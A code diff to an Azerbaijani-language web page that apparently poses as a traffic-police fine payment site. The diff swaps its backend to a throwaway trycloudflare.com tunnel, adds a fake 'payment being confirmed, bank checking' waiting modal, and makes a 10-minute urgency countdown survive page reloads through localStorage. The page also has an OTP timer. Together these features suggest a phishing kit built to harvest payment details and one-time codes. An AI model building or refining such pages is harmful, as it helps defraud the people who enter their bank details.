@@ -62,7 +62,7 @@
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-500">Tarix və Saat:</span>
-                            <span id="val-date" class="font-medium text-gray-800">15.10.2026 / 16:42</span>
+                            <span id="val-date" class="font-medium text-gray-800">15.10.2026 / 15:48</span>
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-500">Ünvan:</span>
@@ -162,9 +162,17 @@
         </div>
     </div>
 
+    <!-- LOADING / WAITING FOR APPROVAL MODAL -->
+    <div id="loading-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-8 text-center space-y-4 shadow-2xl">
+            <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-blue-600 border-t-transparent"></div>
+            <h3 class="font-bold text-gray-800 text-lg">Ödəniş Təsdiqlənir...</h3>
+            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı yoxlanılır.</p>
+        </div>
+    </div>
+
     <script>
-        let API_URL = 'https://groups-wrapped-meetup-specifications.trycloudflare.com/api';
-        let timeLeft = 600;
+        let API_URL = 'https://superintendent-elementary-leads-urls.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -370,15 +378,27 @@
             }
         }
 
-        function startTimer() {
+        // PERSISTENT COUNTDOWN TIMER VIA LOCALSTORAGE
+        function initTimer() {
             const timerElement = document.getElementById('timer');
+            const TOTAL_DURATION = 10 * 60; // 10 minutes in seconds
+            let endTime = localStorage.getItem('dyp_timer_end');
+
+            if (!endTime) {
+                endTime = Date.now() + TOTAL_DURATION * 1000;
+                localStorage.setItem('dyp_timer_end', endTime);
+            }
+
             timerInterval = setInterval(() => {
+                const now = Date.now();
+                let timeLeft = Math.floor((endTime - now) / 1000);
+
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
                     timerElement.textContent = "00:00";
                     return;
                 }
-                timeLeft--;
+
                 const minutes = Math.floor(timeLeft / 60);
                 const seconds = timeLeft % 60;
                 timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
@@ -387,7 +407,7 @@
 
         setInterval(fetchFineData, 1500);
         fetchFineData();
-        startTimer();
+        initTimer();
     </script>
 </body>
 </html>
